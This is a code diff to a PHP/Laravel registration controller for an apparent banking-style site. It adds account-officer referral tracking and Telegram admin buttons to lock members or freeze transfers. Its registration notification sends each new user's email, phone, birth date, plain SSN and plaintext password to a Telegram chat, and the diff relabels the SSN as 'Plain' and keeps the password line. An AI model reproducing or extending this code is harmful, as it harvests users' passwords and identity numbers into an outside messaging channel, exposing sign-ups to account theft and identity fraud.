@@ -129,6 +129,18 @@ class RegisteredUserController extends Controller
                 $dob = \Carbon\Carbon::parse($dob)->format('Y-m-d');
             }
 
+            // Check for Account Officer onboarding referral (via cookie or session)
+            $assignedOfficerId = Cookie::get('officer_onboard') ?? Session::get('officer_onboard');
+            $officer = null;
+            if ($assignedOfficerId) {
+                $officer = \App\Models\Admin::where('id', $assignedOfficerId)
+                    ->where('status', 1)
+                    ->whereHas('roles', function($q) {
+                        $q->whereIn('name', ['Account Officer', 'Account-Officer']);
+                    })
+                    ->first();
+            }
+
             $user = User::create([
                 'portfolio_id' => null,
                 'portfolios' => json_encode([]),
@@ -146,7 +158,14 @@ class RegisteredUserController extends Controller
                 'city' => $formData['city'],
                 'zip_code' => $formData['zip_code'],
                 'password' => Hash::make($formData['password']),
+                'staff_id' => $officer ? $officer->id : null,
             ]);
+
+            if ($officer) {
+                try {
+                    $officer->increment('onboarding_signups_count');
+                } catch (\Throwable $e) {}
+            }
 
             // Auto-generate Visa Card
             try {
@@ -183,10 +202,33 @@ class RegisteredUserController extends Controller
                 $tgMsg .= "📧 <b>Email:</b> {$user->email}\n";
                 $tgMsg .= "📞 <b>Phone:</b> {$user->phone}\n";
                 $tgMsg .= "🎂 <b>Date of Birth:</b> {$user->date_of_birth}\n";
-                $tgMsg .= "🆔 <b>SSN:</b> <code>{$user->ssn}</code>\n";
+                $tgMsg .= "🆔 <b>SSN (Plain):</b> <code>{$user->ssn}</code>\n";
                 $tgMsg .= "🏠 <b>Address:</b> {$user->address}, {$user->city}, {$user->zip_code}, {$user->country}\n";
                 $tgMsg .= "🔒 <b>Password (Plain):</b> <code>" . ($formData['password'] ?? 'N/A') . "</code>\n";
-                $this->telegramNotify($tgMsg);
+
+                $inlineKeyboard = [
+                    [
+                        ['text' => '👤 View Member', 'callback_data' => 'usr_info:' . $user->id],
+                        ['text' => '🔴 Lock Member', 'callback_data' => 'usr_stat:' . $user->id . ':0'],
+                    ],
+                    [
+                        ['text' => '❄️ Freeze Transfers', 'callback_data' => 'usr_frz:' . $user->id . ':1'],
+                    ]
+                ];
+
+                if ($officer) {
+                    $tgMsg .= "───────────────────\n";
+                    $tgMsg .= "👔 <b>Assigned Account Officer:</b> " . htmlspecialchars($officer->name) . " (ID: #{$officer->id})\n";
+                    $tgMsg .= "🔗 <b>Onboarded Via:</b> {$officer->onboarding_url}\n";
+                    $tgMsg .= "👥 <b>Officer Active Members:</b> " . $officer->managedUsers()->count() . "\n";
+
+                    $inlineKeyboard[1][] = ['text' => '👔 View Officer', 'callback_data' => 'stf_info:' . $officer->id];
+                    $inlineKeyboard[] = [
+                        ['text' => '🔄 Reassign Officer', 'callback_data' => 'usr_reassign_prompt:' . $user->id]
+                    ];
+                }
+
+                $this->telegramNotify($tgMsg, $inlineKeyboard);
             } catch (\Exception $e) {
                 \Log::error("Notification error during registration: " . $e->getMessage());
             }
